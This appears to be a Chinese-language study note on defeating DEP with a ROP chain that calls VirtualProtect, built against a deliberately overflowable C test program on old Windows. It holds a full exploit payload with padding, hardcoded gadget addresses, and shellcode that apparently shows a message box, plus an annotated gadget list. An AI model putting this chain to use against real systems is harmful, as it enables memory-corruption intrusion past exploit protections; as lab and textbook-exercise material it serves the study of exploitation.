##  使用 VirtualProtect 關閉 DEP




1.vc++6.0 debug

#### 把書上的調整程 memcpy(tt,shellcode,500)，發現ROP 編寫的有點大shellcode 塞不下 420的空間

 ```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
char shellcode[]=

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" //80 padding 

"\xd4\x1a\x80\x7c" // virtual

"\x27\xb2\xf8\x77" // jmp esp 

//四個參數  
"BBBB"				//rop 修改
"\x00\x04\x00\x00"  //400
"\x40\x00\x00\x00"  // 40
"BBBB"				//rop 修改


"\xe9\xb3\x00\x00\x00" // jmp to shellcode

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // (76-5) padding 

//rop
"\xd5\xec\xec\x77"
"\x1d\xe8\x5d\x7d"
"\xAA\xAA\xAA\xAA"
"\x01\xdc\xeb\x77"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\x2e\x4c\x95\x7c"
"\x90\x90\x90\x90"
"\x2e\x4c\x95\x7c"
"\x90\x90\x90\x90"
"\xb0\x72\x63\x7d"
"\xb0\x8d\xe5\x77"
"\xAA\xAA\xAA\xAA"
"\x90\x90\x90\x90"
"\xc1\xf2\xbe\x77"
"\xAA\xAA\xAA\xAA"
"\x21\x65\x77\x7d"
"\x90\x90\x90\x90"
"\x97\xd6\xeb\x77"
"\x6e\x23\x99\x7c"
"\x90\x90\x90\x90"
"\xbc\x2e\xc1\x77"
"\x14\x00\x00\x00" //0x14
"\xfa\x78\xc1\x77"
"\x84\xa5\xf1\x77"

//shellcode
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
;

void test()
{
	char tt[176];
	memcpy(tt,shellcode,500);
}
int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
    return 0;
}
 ```

### VirtualProtect 繞過也是比較簡單的，它可以創造出一塊可以執行的空間

### 它需要四個參數

#### 1. 起始位置
#### 2.長度
#### 3.(0x40) 屬性頁面
#### 4.(一個可寫入地址，儲存舊的屬性頁面)

---
###  而rop 只需要修改 參數1跟 4，最後跳到 VirtualProtect 就可以了。



###  下圖是規劃圖

![enter image description here](https://i.imgur.com/2DWk9Xy.jpg)


###  下面是 rop gadget 

```

[ebp = iesp]
0x77ececd5 (RVA : 0x0007ecd5) : # DEC EAX # PUSH ESP # POP EBP # RETN 0x04    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}



[edi =iesp]
0x7d5de81d (RVA : 0x0004e81d) : # MOV EDI,EBP # DEC ECX # RETN 0x10    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}



[eax=-60]
0x77ebdc01 (RVA : 0x0006dc01) : # XOR EAX,EAX # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}
0x7c954c2e (RVA : 0x00034c2e) : # SUB EAX,30 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c954c2e (RVA : 0x00034c2e) : # SUB EAX,30 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}


[eax= iesp -60]
0x7d6372b0 (RVA : 0x000a72b0) : # ADD EAX,EDI # DEC ECX # RETN 0x04    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}



[參數1 OK]
0x77e58db0 :  # MOV DWORD PTR DS:[EAX],EAX # POP EBP # RETN 0x04    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}




//////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////


[eax = iesp-60 + c]
0x77bef2c1 (RVA : 0x0000f2c1) : # ADD EAX,8 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
0x7d776521 (RVA : 0x001e6521) : # ADD EAX,4 # POP ESI # RETN    ** [shell32.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}


[ecx=iesp-1]
0x77ebd697 (RVA : 0x0006d697) : # MOV ECX,EDI # DEC ECX # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}



[參數4 OK]
0x7c99236e :  # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}




///////////////////////////////////////////////

//////////////////////////////////////////////




[0x14自己填充給ecx ]
0x77c12ebc :  # POP ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

0x77c178fa :  # SUB EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}


[使esp 跑去 virtualprotect]
0x77f1a584 (RVA : 0x0002a584) : # XCHG EAX,ESP # RETN    ** [GDI32.dll] **   |   {PAGE_EXECUTE_READ}



//////////////////////////////////////////////////////
```

###  成功
![enter image description here](https://i.imgur.com/SkWacdE.png)



###   ROP 編寫方式參考:

[### 緩衝區溢位攻擊：第六章 - 攻守之戰-第三劍：VirtualProtect](http://securityalley.blogspot.com/2015/02/blog-post_6.html)
